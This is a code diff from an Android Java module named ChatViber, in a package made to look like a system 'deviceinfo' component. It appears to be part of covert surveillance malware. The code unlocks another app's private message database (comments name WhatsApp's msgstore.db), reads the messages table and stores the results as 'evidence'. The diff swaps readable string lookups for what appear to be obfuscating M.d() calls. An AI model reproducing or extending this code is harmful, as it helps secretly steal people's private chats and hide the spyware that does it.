@@ -1,11 +1,8 @@
 package com.android.deviceinfo.module.chat;
 
-import java.io.File;
 import java.io.FileInputStream;
-import java.io.FileNotFoundException;
 import java.io.IOException;
 import java.io.ObjectInputStream;
-import java.io.StreamCorruptedException;
 import java.util.ArrayList;
 import java.util.Date;
 import java.util.Hashtable;
@@ -17,15 +14,14 @@ import android.database.sqlite.SQLiteDatabase;
 import android.database.sqlite.SQLiteQueryBuilder;
 import android.util.Pair;
 
-import com.android.deviceinfo.Messages;
 import com.android.deviceinfo.auto.Cfg;
 import com.android.deviceinfo.db.GenericSqliteHelper;
 import com.android.deviceinfo.db.RecordVisitor;
 import com.android.deviceinfo.file.Path;
-import com.android.deviceinfo.manager.ManagerModule;
 import com.android.deviceinfo.module.ModuleAddressBook;
 import com.android.deviceinfo.util.Check;
 import com.android.deviceinfo.util.StringUtils;
+import com.android.m.M;
 
 public class ChatViber extends SubModuleChat {
 	private static final String TAG = "ChatViber";
@@ -116,9 +112,9 @@ public class ChatViber extends SubModuleChat {
 			return;
 		}
 		// f.0=/data/data/com.whatsapp/databases
-		// String dbDir = Messages.getString("f_0");
+		// String dbDir = M.d("/data/data/com.whatsapp/databases");
 		// f.1=/msgstore.db
-		// dbFile = Messages.getString("f_1");
+		// dbFile = M.d("/msgstore.db");
 		try {
 			boolean updateMarkup = false;
 			if (Path.unprotect(dbDir, dbFile, true)) {
@@ -305,9 +301,7 @@ public class ChatViber extends SubModuleChat {
 				}
 			};
 
-			// f_a=messages
-			// Messages.getString("i_2")
-			long newLastId = helper.traverseRecords(Messages.getString("f_a"), visitor);
+			long newLastId = helper.traverseRecords(M.d("messages"), visitor);
 
 			if (messages != null && messages.size() > 0) {
 				saveEvidence(messages);
